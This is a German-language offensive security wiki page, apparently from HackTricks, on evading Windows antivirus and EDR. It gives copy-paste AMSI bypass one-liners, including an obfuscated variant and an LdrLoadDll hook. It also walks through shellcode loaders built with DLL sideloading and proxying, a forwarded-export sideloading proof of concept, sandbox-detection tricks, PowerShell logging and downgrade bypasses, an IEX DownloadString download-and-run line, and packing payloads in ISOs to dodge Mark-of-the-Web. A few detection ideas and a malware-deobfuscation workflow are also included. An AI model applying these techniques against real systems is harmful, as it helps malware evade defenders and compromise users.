# Antivirus (AV) Umgehung

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender lahmzulegen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender lahmzulegen, indem ein anderes AV vorgetäuscht wird.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodologie**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: statische Erkennung, dynamische Analyse und bei fortgeschrittenen EDRs Verhaltensanalyse.

### **Statische Erkennung**

Statische Erkennung funktioniert, indem bekannte bösartige Strings oder Byte-Arrays in einer Binary oder einem Script markiert werden, und indem Informationen aus der Datei selbst extrahiert werden (z. B. File description, company name, digital signatures, icon, checksum, usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dazu führen kann, dass man leichter entdeckt wird, da diese Tools wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt ein paar Möglichkeiten, um diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binary verschlüsselst, gibt es für das AV keine Möglichkeit, dein Programm zu erkennen, aber du benötigst einen Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuskation**

Manchmal reicht es, einige Strings in deiner Binary oder deinem Script zu ändern, um am AV vorbeizukommen, aber das kann je nach dem, was du obfuskieren willst, zeitaufwändig sein.

- **Custom tooling**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schlechten Signaturen, aber das kostet viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, Windows Defender gegen statische Erkennung zu prüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Grunde in mehrere Segmente und lässt Defender jedes einzeln scannen; so kann es dir genau sagen, welche Strings oder Bytes in deiner Binary markiert werden.

Ich empfehle dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzuschauen.

### **Dynamische Analyse**

Dynamische Analyse bedeutet, dass das AV deine Binary in einer Sandbox ausführt und nach bösartigem Verhalten sucht (z. B. versuchen, Passwörter deines Browsers zu entschlüsseln und auszulesen, ein Minidump von LSASS zu erstellen, usw.). Dieser Teil kann etwas schwieriger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Abhängig davon, wie es implementiert ist, kann das eine gute Methode sein, die dynamische Analyse von AVs zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, um den Arbeitsfluss des Benutzers nicht zu stören, daher können lange Sleeps die Analyse stören. Das Problem ist, dass viele AV-Sandboxes den Sleep einfach überspringen können, abhängig von der Implementierung.
- **Checking machine's resources** Normalerweise haben Sandboxes nur sehr wenige Ressourcen zur Verfügung (z. B. < 2GB RAM), sonst würden sie den Rechner des Benutzers verlangsamen. Hier kannst du auch kreativ werden, z. B. die CPU-Temperatur oder sogar die Lüftergeschwindigkeit prüfen — nicht alles wird in der Sandbox implementiert.
- **Machine-specific checks** Wenn du einen Benutzer angreifen willst, dessen Workstation der Domain "contoso.local" beigetreten ist, kannst du die Computer-Domain prüfen und vergleichen; falls sie nicht übereinstimmt, kannst du dein Programm beenden.

Es stellt sich heraus, dass Microsoft Defender's Sandbox Computername HAL9TH ist. Du kannst also vor der Detonation in deiner Malware den Computername prüfen; wenn der Name HAL9TH ist, befindest du dich in Defender's Sandbox, und du kannst dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie bereits erwähnt, werden **öffentliche Tools** früher oder später **entdeckt**, also solltest du dir folgende Frage stellen:

Wenn du zum Beispiel LSASS dumpen willst, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Mimikatz ist vermutlich eines der — wenn nicht das — am meisten von AVs und EDRs markierten Tools; das Projekt selbst ist super, aber es ist ein Alptraum, damit AVs zu umgehen. Such also nach Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, stelle sicher, dass du die automatische Sample-Submission in Defender ausschaltest, und bitte, im Ernst, **DO NOT UPLOAD TO VIRUSTOTAL**, wenn dein Ziel langfristige Evasion ist. Wenn du prüfen willst, ob deine Payload von einem bestimmten AV erkannt wird, installiere dieses in einer VM, versuche, die automatische Sample-Submission auszuschalten, und teste dort, bis du zufrieden bist.

## EXEs vs DLLs

Wann immer möglich, priorisiere die Verwendung von DLLs für Evasion. Nach meiner Erfahrung sind DLL-Dateien in der Regel deutlich weniger erkannt und analysiert, daher ist es ein sehr einfacher Trick, um in einigen Fällen die Erkennung zu vermeiden (vorausgesetzt, deine Payload kann natürlich als DLL ausgeführt werden).

Wie wir in diesem Bild sehen, hat ein DLL-Payload von Havoc eine Detection-Rate von 4/26 bei antiscan.me, während der EXE-Payload eine Detection-Rate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nun zeigen wir einige Tricks, die du mit DLL-Dateien verwenden kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge des Loaders aus, indem die Opferanwendung und die bösartigen Payload(s) nebeneinander positioniert werden.

Du kannst Programme, die für DLL Sideloading anfällig sind, mit [Siofra](https://github.com/Cybereason/siofra) und folgendem powershell script überprüfen:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking innerhalb von "C:\Program Files\\" anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **explore DLL Hijackable/Sideloadable programs yourself** — diese Technik ist bei richtiger Anwendung ziemlich stealthy. Wenn du jedoch öffentlich bekannte DLL Sideloadable-Programme verwendest, kannst du leicht erwischt werden.

Allein das Platzieren einer bösartigen DLL mit dem von einem Programm erwarteten Namen lädt nicht automatisch deinen payload, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy-(und bösartige) DLL richtet, an die Original-DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten und die Ausführung deines payloads kann verarbeitet werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Das sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcode-Vorlage und die ursprünglich umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Unser shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) und die proxy DLL haben beide eine Erkennungsrate von 0/26 bei [antiscan.me](https://antiscan.me)! Das würde ich als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass Sie sich [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ansehen, um mehr über das, was wir eingehender besprochen haben, zu erfahren.

### Missbrauch von Forwarded Exports (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die tatsächlich "forwarders" sind: anstatt auf Code zu verweisen, enthält der Exporteintrag eine ASCII-Zeichenkette der Form `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, wird der Windows-Loader:

- `TargetDll` laden, falls es noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die auch das Verzeichnis des Moduls einschließt, das die Forward-Auflösung durchführt.

Dies ermöglicht eine indirekte sideloading-Primitive: finde eine signed DLL, die eine Funktion exportiert, die an einen nicht-KnownDLL-Modulnamen weitergeleitet wird, und platziere diese signed DLL im selben Verzeichnis wie eine vom Angreifer kontrollierte DLL, die genau den weitergeleiteten Zielmodulnamen trägt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wobei deine DllMain ausgeführt wird.

Beispiel beobachtet unter Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird sie über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` in denselben Ordner. Ein minimales DllMain reicht aus, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Die Weiterleitung mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signed) lädt die side-by-side `keyiso.dll` (signed)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Anschließend lädt der Loader `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du erst nach Ausführung von `DllMain` einen "missing API"-Fehler

Hunting-Tipps:
- Konzentriere dich auf forwarded exports, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Du kannst forwarded exports mit Tools wie zum Beispiel auflisten:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 Forwarder-Inventar, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Erkennungs-/Abwehrideen:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Alarm bei Prozess-/Modulketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` unter benutzerschreibbaren Pfaden
- Durchsetzung von Code-Integritätsrichtlinien (WDAC/AppLocker) und Verweigern von write+execute in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Du kannst Freeze verwenden, um deinen shellcode auf unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel — was heute funktioniert, kann morgen entdeckt werden. Verlasse dich also niemals nur auf ein Tool; wenn möglich, versuche mehrere Evasion-Techniken zu kombinieren.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde geschaffen, um "fileless malware" zu verhindern. Ursprünglich konnten AVs nur Dateien auf der Festplatte scannen, daher konnte ein Payload, der direkt im Speicher ausgeführt wurde, vom AV nicht erkannt werden, da die Sichtbarkeit fehlte.

Die AMSI-Funktion ist in folgenden Windows-Komponenten integriert.

- User Account Control, or UAC (Erhöhung von Rechten bei EXE-, COM-, MSI- oder ActiveX-Installationen)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Sie erlaubt Antivirus-Lösungen, das Verhalten von Skripten zu inspizieren, indem Skriptinhalte in einer Form offengelegt werden, die weder verschlüsselt noch obfuskiert ist.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt die folgende Warnung in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführenden Datei angibt — in diesem Fall powershell.exe

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem wegen AMSI im Speicher entdeckt.

Außerdem werden seit .NET 4.8 auch C#-Codes über AMSI ausgeführt. Das betrifft sogar `Assembly.Load(byte[])` für in-memory Ausführung. Deshalb wird empfohlen, für In-Memory-Ausführung ältere .NET-Versionen (wie 4.7.2 oder niedriger) zu verwenden, wenn man AMSI umgehen möchte.

Es gibt ein paar Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die man laden möchte, eine gute Methode zur Umgehung sein.

Allerdings ist AMSI in der Lage, Skripte zu deobfuskieren, selbst wenn mehrere Schichten vorhanden sind, sodass Obfuskation je nach Umsetzung keine gute Option sein könnte. Das macht die Umgehung nicht unbedingt trivial. Manchmal reicht es jedoch, ein paar Variablennamen zu ändern, und es funktioniert — es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den powershell- (und auch cscript.exe, wscript.exe, etc.) Prozess implementiert wird, ist es möglich, diese Manipulation auch als nicht privilegierter Benutzer relativ einfach durchzuführen. Aufgrund dieses Implementierungsfehlers haben Forscher mehrere Methoden zur Umgehung der AMSI-Scans gefunden.

**Fehler erzwingen**

Das Erzwingen eines Fehlschlags der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan initiiert wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles, was es brauchte, war eine einzige Zeile powershell-Code, um AMSI für den aktuellen powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher ist eine Modifikation nötig, um diese Technik zu verwenden.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich als verdächtig markiert wird, sobald dieser Beitrag veröffentlicht wird; veröffentliche daher keinen Code, wenn du unentdeckt bleiben willst.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User‑Mode‑Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und es finden für diesen Prozess keine Scans statt.

Implementierungsübersicht (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Funktioniert sowohl mit PowerShell, WScript/CScript als auch mit custom loaders (alles, was sonst AMSI laden würde).
- Kombiniere es mit dem Einlesen von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Kommandozeilen‑Artefakte zu vermeiden.
- Wurde bei Loaders beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Dieses Tool [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) generiert ebenfalls Skripte, um AMSI zu umgehen.

**Erkannte Signatur entfernen**

Du kannst Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Diese Tools scannen den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreiben sie anschließend mit NOP-Instruktionen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Das kannst du so tun:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ist eine Funktion, mit der alle PowerShell-Befehle, die auf einem System ausgeführt werden, protokolliert werden können. Das kann für Auditing und Fehlersuche nützlich sein, aber es ist auch ein **Problem für Angreifer, die der Erkennung entgehen wollen**.

Um PowerShell logging zu umgehen, können Sie folgende Techniken verwenden:

- **Disable PowerShell Transcription and Module Logging**: Sie können hierfür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne dass sie von AMSI gescannt werden. Das geht z.B.: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine PowerShell ohne Schutzmechanismen zu starten (das ist das, was `powerpick` von Cobal Strike verwendet).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Beim Analysieren von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, trifft man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der unten beschriebene Workflow stellt zuverlässig ein nahezu originales IL wieder her, das anschließend in Tools wie dnSpy oder ILSpy nach C# dekompiliert werden kann.

1.  Anti-tampering removal – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Konstruktor des *module* (`<Module>.cctor`). Das verändert außerdem die PE-Checksum, sodass jede Modifikation die Binärdatei zum Absturz bringen kann. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadaten-Tabellen zu finden, die XOR-Keys wiederherzustellen und eine saubere Assembly neu zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol / control-flow recovery – geben Sie die *clean* Datei an **de4dot-cex** (einen ConfuserEx-kompatiblen Fork von de4dot):
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx 2-Profil  
• de4dot wird control-flow flattening rückgängig machen, ursprüngliche Namespaces, Klassen und Variablennamen wiederherstellen und konstante Strings entschlüsseln.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (a.k.a *proxy calls*), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` sehen, statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …).

4.  Manual clean-up – führen Sie die resultierende Binärdatei in dnSpy aus, suchen Sie nach großen Base64-Blobs oder nach Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *real* payload zu lokalisieren. Häufig speichert die Malware dieses als TLV-kodiertes Byte-Array, das in `<Module>.byte_0` initialisiert wird.

Die oben beschriebene Kette stellt den Ausführungsfluss **wiederher**, ohne die bösartige Probe ausführen zu müssen – nützlich, wenn man an einer Offline-Workstation arbeitet.

> 🛈  ConfuserEx produziert ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) compilation suite bereitzustellen, der erhöhte Software-Sicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und tamper-proofing bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die Sprache `C++11/14` verwendet, um zur Kompilierzeit obfuscated code zu erzeugen, ohne ein externes Tool zu benutzen und ohne den Compiler zu modifizieren.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuscated operations hinzu, die vom C++ template metaprogramming framework erzeugt werden und das Leben der Person, die versucht, die Anwendung zu knacken, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der in der Lage ist, verschiedene PE files zu obfuscaten, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphic code engine für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein granuliertes code obfuscation framework für LLVM-unterstützte Sprachen unter Verwendung von ROP (return-oriented programming). ROPfuscator obfuscates ein Programm auf Assembly-Ebene, indem reguläre Instruktionen in ROP chains transformiert werden, wodurch unsere natürliche Vorstellung von normalem control flow unterlaufen wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ist in der Lage, bestehende EXE/DLL in shellcode zu konvertieren und diese dann zu laden

## SmartScreen & MoTW

Sie haben diesen Bildschirm vielleicht gesehen, wenn Sie einige Executables aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz, was bedeutet, dass ungewöhnlich heruntergeladene Anwendungen SmartScreen auslösen und den Endbenutzer warnen und daran hindern, die Datei auszuführen (obwohl die Datei immer noch ausgeführt werden kann, indem man More Info -> Run anyway klickt).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch zusammen mit der URL, von der sie heruntergeladen wurden, erstellt wird.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Prüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass Executables, die mit einem **trusted** signing certificate signiert sind, **nicht** SmartScreen auslösen.

Eine sehr effektive Methode, um zu verhindern, dass Ihre Payloads das Mark of The Web erhalten, besteht darin, sie in irgendeiner Art von Container wie einer ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **non NTFS** Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabecontainer verpackt, um Mark-of-the-Web zu umgehen.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
